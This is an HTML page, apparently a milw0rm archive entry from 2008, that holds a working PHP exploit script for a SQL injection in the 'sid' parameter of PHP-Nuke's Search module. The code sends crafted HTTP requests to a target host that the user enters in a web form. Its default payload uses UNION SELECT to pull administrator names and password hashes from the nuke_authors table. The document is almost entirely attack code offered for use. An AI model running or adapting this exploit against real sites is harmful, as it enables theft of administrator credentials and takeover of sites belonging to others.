<html><head><title>PHP-Nuke <= 8.0 Final (sid) Remote SQL Injection Exploit</title></head><pre>&lt;?php
##########################################################
# UNPUBLISHED RST/GHC EXPLOIT
# PHP Nuke `sid` sql injection exploit for Search module
# POST method -
# the best for version 8.0 FINAL
# (c)oded by Foster &amp; 1dt.w0lf
##########################################################
# tested on 6.0 , 6.6 , 7.9 , 8.0 FINAL versions
##########################################################

if (isset($_POST['Submit'])){
$result=sendit('CONCAT(&quot;::&quot;,aid,&quot;::&quot;,pwd,&quot;::&quot;)');
if (preg_match(&quot;/::([^:]*)::([a-f0-9]{32})::/&quot;,$result, $matches))
{$ahash = $matches[2]; $aname = $matches[1];}

}

function sendit($param){
$prefix = $_POST['prefix'];
$data = $_POST['sql_text'];
$host = $_POST['hostname'];
$page = (isset($_POST['dir'])) ? '/'.$_POST['dir'] : '';
$page .= '/modules.php?name=Search';
$method = $_POST['method'];
$ref_text = $_POST['ref_text'];
$user_agent = $_POST['user_agent'];
$result = '';
$sock = fsockopen($host, 80, $errno, $errstr, 50);
if (!$sock) die(&quot;$errstr ($errno)\n&quot;);
fputs($sock, &quot;$method /$page HTTP/1.0\r\n&quot;);
fputs($sock, &quot;Host: $host&quot; . &quot;\r\n&quot;);
fputs($sock, &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;);
fputs($sock, &quot;Content-length: &quot; . strlen($data) . &quot;\r\n&quot;);
fputs($sock, &quot;Referer: $ref_text&quot;. &quot;\r\n&quot;);
fputs($sock, &quot;User-Agent: $user_agent&quot; . &quot;\r\n&quot;);
fputs($sock, &quot;Accept: */*\r\n&quot;);
fputs($sock, &quot;\r\n&quot;);
fputs($sock, &quot;$data\r\n&quot;);
fputs($sock, &quot;\r\n&quot;);

while (!feof($sock)) {
$result .= fgets ($sock,8192);
}
fclose($sock);
return $result;

}


?&gt;

&lt;head&gt;
&lt;meta http-equiv=Content-Type content=&quot;text/html; charset=windows-1251&quot;&gt;
&lt;TITLE&gt;RST/GHC PHP Nuk'em exploit&lt;/TITLE&gt;
&lt;style&gt;
a:link{color: #000000; text-decoration: none;}
a:visited{color: #000000; text-decoration: none;}
a:hover,a:active{color:#e49a34; text-decoration:underline;}
table{color:#000000;font-family:verdana;font-size:8pt;}
.style2 {
color: #FFFFFF;
font-weight: bold;
}
.style3 {color: #E39930}
.style5 {color: #000000; font-weight: bold; }
&lt;/style&gt;
&lt;body bgcolor=&quot;#525254&quot;&gt;
&lt;form method=post&gt;
&lt;p class=&quot;style2&quot;&gt;&lt;font size=&quot;3&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;PHP Nuke &lt;span class=&quot;style3&quot;&gt;QUERY MANIPULATOR&lt;/span&gt; based on &lt;font size=&quot;3&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;`sid` POST sql injection&lt;/font&gt; exploit for Search module &lt;/font&gt;&lt;/p&gt;
&lt;table width=&quot;900&quot; border=&quot;0&quot;&gt;
&lt;tr bgcolor=&quot;#FFFFFF&quot;&gt;
&lt;td width=&quot;12%&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot; size=&quot;2&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;Parameter&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td width=&quot;88%&quot; bgcolor=&quot;#FFFFFF&quot;&gt;&lt;span class=&quot;style5&quot;&gt;&lt;font size=&quot;2&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;Value&lt;/font&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td bgcolor=&quot;E39930&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot; size=&quot;2&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;url
&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td bgcolor=&quot;#999999&quot;&gt;&lt;font face=&quot;Arial, Helvetica, sans-serif&quot;&gt;
&lt;input name=&quot;hostname&quot; type=&quot;text&quot; id=&quot;hostname&quot; value=&quot;&lt;?=(isset($_POST['hostname'])) ? $_POST['hostname'] : 'nuke.cc'; ?&gt;&quot;&gt;
&lt;/font&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td bgcolor=&quot;E39930&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot; size=&quot;2&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;dir&lt;/font&gt;
&lt;/strong&gt;&lt;/td&gt;
&lt;td bgcolor=&quot;#999999&quot;&gt;&lt;font face=&quot;Arial, Helvetica, sans-serif&quot;&gt;
&lt;input name=&quot;dir&quot; type=&quot;text&quot; id=&quot;dir&quot; value=&quot;&lt;?=(isset($_POST['dir'])) ? $_POST['dir'] : 'phpnuke'; ?&gt;&quot;&gt;
&lt;/font&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td bgcolor=&quot;E39930&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot; size=&quot;2&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;referer&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td bgcolor=&quot;#999999&quot;&gt;&lt;font face=&quot;Arial, Helvetica, sans-serif&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;ref_text&quot; value=&quot;&lt;?=(isset($_POST['ref_text'])) ? $_POST['ref_text'] : 'http://jihad.in.us'; ?&gt;&quot; size=&quot;60&quot;&gt;
&lt;/font&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td bgcolor=&quot;E39930&quot;&gt;SQL query&lt;/td&gt;
&lt;td bgcolor=&quot;#999999&quot;&gt;&lt;font face=&quot;Arial, Helvetica, sans-serif&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;sql_text&quot; value=&quot;&lt;?=(isset($_POST['sql_text'])) ? $_POST['sql_text'] : 'query=AAA&amp;topic=&amp;category=0&amp;author=&amp;days=0&amp;type=comments&amp;sid=999999\'/**/UNION%20SELECT%20`pwd`%20as%20title%20FROM%20nuke_authors%20WHERE%20radminsuper=\'1'; ?&gt;&quot; size=&quot;80&quot;&gt;
&lt;/font&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td bgcolor=&quot;E39930&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot; size=&quot;2&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;user
agent&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td bgcolor=&quot;#999999&quot;&gt;&lt;font face=&quot;Arial, Helvetica, sans-serif&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;user_agent&quot; value=&quot;&lt;?=(isset($_POST['user_agent'])) ? $_POST['user_agent'] : 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)'; ?&gt;&quot; size=&quot;60&quot;&gt;
&lt;/font&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td bgcolor=&quot;E39930&quot;&gt;&lt;strong&gt;&lt;font size=&quot;2&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;table prefix &lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td bgcolor=&quot;#999999&quot;&gt;&lt;font face=&quot;Arial, Helvetica, sans-serif&quot;&gt;
&lt;input name=&quot;prefix&quot; type=&quot;text&quot; id=&quot;prefix&quot; value=&quot;&lt;?=(isset($_POST['prefix'])) ? $_POST['prefix'] : 'nuke'; ?&gt;&quot;&gt;
&lt;/font&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td bgcolor=&quot;E39930&quot;&gt;&lt;strong&gt;&lt;font size=&quot;2&quot; face=&quot;Arial, Helvetica, sans-serif&quot;&gt;method&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td bgcolor=&quot;#999999&quot;&gt;&lt;select name=&quot;method&quot; size=&quot;1&quot; id=&quot;method&quot;&gt;
&lt;option value=&quot;POST&quot;&gt;POST&lt;/option&gt;
&lt;option value=&quot;GET&quot;&gt;GET&lt;/option&gt;
&lt;/select&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td bgcolor=&quot;E39930&quot;&gt;&amp;nbsp;&lt;/td&gt;
&lt;td bgcolor=&quot;#999999&quot;&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;p&gt;
&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;rock-n-roll&quot;&gt;
&lt;/p&gt;
&lt;/form&gt;




&lt;font size=&quot;2&quot;&gt;(c) RST/GHC&lt;/font&gt;

&lt;hr size=&quot;3&quot;&gt;
&lt;?
# DEBUG

print $result;
?&gt;

# milw0rm.com [2008-01-22]</pre></html>